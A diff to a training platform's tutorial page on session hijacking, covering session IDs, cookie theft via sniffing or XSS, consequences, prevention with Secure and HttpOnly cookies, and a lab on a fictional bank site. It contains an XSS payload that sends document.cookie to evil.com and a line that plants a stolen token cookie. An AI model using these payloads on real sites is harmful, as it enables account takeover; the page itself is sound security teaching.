@@ -10,7 +10,7 @@
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
         integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
 
-    <link rel="stylesheet" href="../index.css">
+    <link rel="stylesheet" href="../user-portal/common.css">
     <link rel="stylesheet" href="session_hijacking.css">
 
     <title>Web-Vulnerability Platform</title>
@@ -60,25 +60,104 @@
             <hr>
             <h3>What</h3>
             <p>
-
+                In order to understand the concept of session hijacking, it is important to first understand what a web
+                session exactly is and why it is needed. A web session is a sequence of network HTTP requests and
+                responses associated with the same user <cite><a
+                        href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html"
+                        target="_blank">[OWASP]</a></cite>.
+                Because HTTP is a stateless protocol, in order to introduce the concept of a session, it is required to
+                implement session management capabilities that link the authentication and access control modules of a
+                web applications. This is done by generating a session ID (or token) for each user. The session ID binds
+                the user authentication credentials (in the form of a user session) to the user's HTTP traffic. Once an
+                authenticated session has been established, the session ID is temporarily equivalent to the
+                strongest authentication method used by the application, such as username and password.
+            </p>
+            <p>
+                If the session ID is somehow obtained by an adversary, they can perform a <strong>session
+                    hijacking</strong> attack, where an attacker is able to fully impersonate a victim user in the web
+                application. Attackers can perform two types of session hijacking attacks: targeted or generic. In a
+                targeted attack, the attacker's goal is to impersonate a specific web application user, while for
+                generic attacks, the attacker's goal is to impersonate any valid or legitimate user of the web
+                application.
             </p>
             <hr>
-            <h3>How</h3>
+            <h3 id="how">How</h3>
             <p>
-
+                Multiple mechanisms are available in HTTP to maintain session state within web applications, such
+                as cookies, URL parameters and body arguments on POST requests (i.e. hidden form fields in HTML forms).
+                By far the most prevalent of these mechanism is using cookies to keep track of the session ID. As such
+                we will focus on session hijacking by obtaining this session ID from the cookies set in the victim's
+                browser.
+            </p>
+            <p>
+                There are multiple ways in which the attacker can obtain the victim's cookies, and thus the victim's
+                session ID. The attacker can use a "Session side jacking" attack, where they either monitor
+                traffic on a public network, or force the victim to connect to an access point controlled by the
+                attacker in a so-called Man-in-the-Middle (MitM) attack. By monitoring traffic of the victim, the
+                attacker can intercept session cookies when they are set by the web server, obtaining the
+                session ID.
+            </p>
+            <p>
+                The attacker can also use a <a href="/pages/xss.html">cross-site scripting (XSS)</a> attack, as
+                discussed
+                previously, to execute javascript code that sends the victim's cookies to the attacker. An example
+                payload that does exactly this is as follows:
+            </p>
+            <pre class="prettyprint">
+&ltscript&gtnew Image().src = "http://evil.com/steal-cookies?cookies=" + document.cookie;&lt/script&gt
+</pre>
+            <p>
+                This code will add a HTML <code>&ltimg&gt</code> element to the DOM. When this image is loaded a request
+                to the source URL is send, compromising the victim's cookies.
+            </p>
+            <p>
+                A final pitfall (one that we will be exploiting in the example) is not destroying the user session on
+                the server side. When a user clicks on the sign out button, or when the cookie expires, the application
+                is
+                supposed to destroy all the session variables that are handled on the server side - invalidating the
+                session ID/token. If the developers just delete the cookies on the client side, the session on the
+                server is active indefinitely. This means that when an attacker obtains the session ID, they can still
+                access the application even though the user is no longer logged in! This way session hijacking attacks
+                can be performed at any time, not just when the user session is active.
             </p>
             <hr>
             <h3>Consequences</h3>
             <p>
-
+                The consequences of a session hijacking attack are devasting, but quite straightforward. Everything the
+                authenticated user can normally do on the vulnerable application, can now be performed by the attacker
+                as if they were the user. This means the severity of the consequences depends on the sensitivity of the
+                application. A limiting factor is the timeframe in which the user session is active (assuming a proper
+                logout implementation and cookies with a reasonable expiry date), since the access to the account is
+                revoked if the user session is destroyed.
             </p>
             <hr>
             <h3>Prevention</h3>
             <p>
+                To prevent session hijacking multiple steps can be taken. First of all, it is highly recommended to use
+                existing session management mechanisms. These are provided by most popular web frameworks, and should be
+                preferred over inventing your own session management as they are tried and tested.
+            </p>
+            <p>
+                To specifically prevent the hijacking of cookies containing the session ID, several cookie attributes
+                can be set.
 
+                The <code>Secure</code> cookie attribute instructs web browsers to only send the cookie through an
+                encrypted HTTPS (SSL/TLS) connection. This session protection mechanism is mandatory to prevent session
+                ID stealing through the <a href="#how">aforementioned</a> "Session sidejacking" attacks. It ensures
+                that an attacker cannot simply capture the session ID from web browser traffic.
+            </p>
+            <p>
+                The <code>HttpOnly</code> cookie attribute instructs web browsers to not allow any scripts (e.g.
+                JavaScript) the ability to access the cookies via the DOM <code>document.cookie</code> object. This
+                session ID protection is mandatory to prevent session ID stealing through XSS attacks.
+            </p>
+            <p>
+                A final prevention method is to perform additional user identity verification besides the session ID.
+                This means not only assigning cookies, but also keeping track of the user's IP address and other
+                application usage patterns.
             </p>
             <hr>
-            <h3>Examples</h3>
+            <h3>Example</h3>
             <p>
                 To illustrate session hijacking we will once again <strong>authenticate as one of the users of
                     <i>insecurebanking.com</i></strong>.
@@ -158,7 +237,7 @@
                     Now that you have authenticated as one of the users of <i>insecurebanking.com</i>, multiple cookies
                     are set by the website. The names and values of these cookies are shown in the table below.
                 </p>
-                <table class="table table-striped">
+                <table class="table table-striped cookie-table">
                     <thead>
                         <tr>
                             <th scope="col">Name</th>
@@ -170,14 +249,15 @@
                 </table>
 
                 <p>
-                    An attacker can steal these cookies in multiple ways. TODO
+                    An attacker can steal these cookies in multiple ways, as discussed <a href="#how">above</a>.
                     For simplicity sake we will assume that the attacker has succeeded in stealing the cookie containing
-                    the token. <strong>Find the <i>token</i> cookie and copy the corresponding value.</strong>
+                    the session ID (the token cookie). To simulate this, <strong>find the <i>token</i> cookie and copy
+                        the corresponding value.</strong>
                 </p>
 
                 <p>
-                    Once the attacker possesses the token all they have to do is set the cookie in their own browser.
-                    This can be done using javascript as follows:
+                    Once the attacker possesses the token all they have to do to hijack the user session is set the
+                    cookie in their own browser. This can be done using javascript as follows:
                 </p>
 
                 <pre class="prettyprint">
@@ -220,7 +300,7 @@ document.cookie="token={stolen_token}; path=/"
         integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
         crossorigin="anonymous"></script>
     <script src="https://cdn.jsdelivr.net/gh/google/code-prettify@master/loader/run_prettify.js"></script>
-    <script src="../reset.js"></script>
+    <script src="../user-portal/reset.js"></script>
     <script src="session_hijacking.js"></script>
 </body>
 
